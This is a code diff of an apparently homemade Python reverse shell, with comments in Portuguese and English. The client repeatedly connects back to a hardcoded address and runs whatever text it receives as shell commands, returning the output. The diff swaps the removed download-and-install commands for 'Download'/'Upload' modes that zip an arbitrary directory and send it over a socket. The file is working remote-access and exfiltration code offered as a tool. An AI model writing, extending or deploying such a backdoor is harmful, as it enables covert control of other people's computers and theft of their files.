@@ -2,12 +2,11 @@ import socket
 import time
 import subprocess
 import os
-#import shutil
-#import requests
+import zipfile
 
+ip = "127.0.0.1"
+port = 8081
 
-ip = "192.168.1.7"
-port = 7272
 
 def connection(ip, port):
     while True:
@@ -15,13 +14,9 @@ def connection(ip, port):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((ip, port))
             s.send(b"\n[!] Connection received.\n")
-
             return s
         except socket.error as e:
-            if e.errno == 106:
-                print("Socket already connected. Retrying...")
-            else:
-                print("Connection error:", e)
+            print("Connection error:", e)
             time.sleep(10)
 
 def listen(s):
@@ -45,71 +40,116 @@ def cmd(s, data):
             help_text = """\n##########
 
 Manual:
-execute - before execution commands e.g., python file.py to receive a confirmation that you are executing a file;
-cd - to change the directory you are in e.g., cd downloads;
-ls or dir - to list folders and files;
-ipconfig or ifconfig - to se your ip addresses.;
-
-OBS: Você pode executar muitos comandos do próprio terminal normalmente
+execute - to execute commands;
+cd - to change directory;
+ls or dir - to list files;
+ipconfig or ifconfig - to see IP addresses.
+Download - Download mode for files from the server(make shure you are using the client.py file listening on 8888);
+Upload - to upload files from your computer(make shure you are using the server.py on the same port and address).
 
 ##########\n\n"""
             send_data(s, help_text)
+
         elif data.startswith("execute"):
-            arquivo = data.split(" ", 1)[1]
-            proc = subprocess.Popen(arquivo, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            out, err = proc.communicate()
-            send_data(s, out.decode())
-            send_data(s, "[+] Executando arquivo...\n")
-        elif data.startswith("baixar"):
-
-            url = data.split(" ", 1)[1]
-
-            file_name = os.path.basename(url)
-
-            download_file(url, file_name)
-
-            send_data(s, f"[+] Arquivo {file_name} baixado com sucesso.\n")
-
-        elif data.startswith("install"):
-
-            file_name = data.split(" ", 1)[1]
-
-            target_directory = os.path.join(os.getcwd(), "downloads") 
-            os.makedirs(target_directory, exist_ok=True)
-            shutil.move(file_name, os.path.join(target_directory, file_name))
-            send_data(s, "[+] Instalando arquivo...\n")
-
-            if not is_compatible(file_name):
-                send_data(s, f"[-] O arquivo {file_name} não é compatível com este sistema operacional.\n")
-
-                os.remove(os.path.join(target_directory, file_name))
-            else:
-                send_data(s, f"[+] Arquivo {file_name} instalado com sucesso em {target_directory}.\n")
+            command = data.split(" ", 1)[1]
+            output = subprocess.run(command, shell=True, capture_output=True, text=True)
+            send_data(s, output.stdout)
 
         elif data.startswith("cd"):
             directory = data.split(" ", 1)[1]
             os.chdir(directory)
-            send_data(s, "[+] Diretorio alterado com sucesso.\n")
+            send_data(s, "[+] Directory changed successfully.\n")
+
+        elif data.startswith("Download"):
+            send_data(s, "\n[!] Trying connection with the client on port 8888...\n")
+            server()
+
+        elif data.startswith("Upload"):
+            send_data(s,"\n[!] Trying connection with the server...\n")
+            client_path()
+
         else:
-            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            out, err = proc.communicate()
-            send_data(s, out.decode())
+            output = subprocess.run(data, shell=True, capture_output=True, text=True)
+            send_data(s, output.stdout)
+
     except Exception as e:
         print("Error in cmd:", e)
 
-def is_compatible(file_name):
-
-    allowed_extensions = {".exe", ".zip", ".tar", ".gz", ".tar.gz"}
-    _, file_extension = os.path.splitext(file_name)
-    return file_extension.lower() in allowed_extensions
 
 def send_data(s, data):
     s.send(data.encode())
 
-def download_file(url, target_filename):
-    response = requests.get(url)
-    with open(target_filename, 'wb') as file:
-        file.write(response.content)
+def compactar_diretorio(diretorio, arquivo_saida):
+    with zipfile.ZipFile(arquivo_saida, 'w') as zipf:
+        for raiz, _, arquivos in os.walk(diretorio):
+            for arquivo in arquivos:
+                caminho_completo = os.path.join(raiz, arquivo)
+                relativo = os.path.relpath(caminho_completo, diretorio)
+                zipf.write(caminho_completo, relativo)
+
+def client_path():
+    try:
+        while True:
+            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
+            client.connect(('127.0.0.1', 8889))
+            print('Connected [!]\n')
+
+            directory_name = input('Enter the directory to zip> ')
+            client.send(directory_name.encode())
+
+            with open('received_file.zip', 'wb') as file:
+                while True:
+                    data = client.recv(4096)
+                    if not data:
+                        break
+                    file.write(data)
+
+            print(f'File received as received_file.zip [ok]')
+            client.close()
+            break
+    except ConnectionRefusedError as e:
+        print("Connection error: ", e)
+    except Exception as e:
+        print("Connection error: ", e)
+
+def server():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind(('127.0.0.1', 8888))
+    server.listen(1)
+
+    print('Waiting for a connection...')
+    connection, address = server.accept()
+    print(f'Connection from {address}')
+
+    diretorio_cliente = connection.recv(1024).decode()
+
+    if not os.path.exists(diretorio_cliente) or not os.path.isdir(diretorio_cliente):
+        print(f"Directory '{diretorio_cliente}' does not exist or is not a directory.")
+        connection.close()
+        server.close()
+        exit()
+
+    arquivo_zip_saida = 'arquivo_enviado.zip'
+    compactar_diretorio(diretorio_cliente, arquivo_zip_saida)
+
+    if os.path.getsize(arquivo_zip_saida) == 0:
+        print(f"Failed to create ZIP file for directory '{diretorio_cliente}'.")
+        connection.close()
+        server.close()
+        exit()
+
+    with open(arquivo_zip_saida, 'rb') as file:
+        while True:
+            data = file.read(4096)
+            if not data:
+                break
+            connection.sendall(data)
+
+    print('ZIP file sent.')
+    server.close()
+
 
 def main():
     while True:
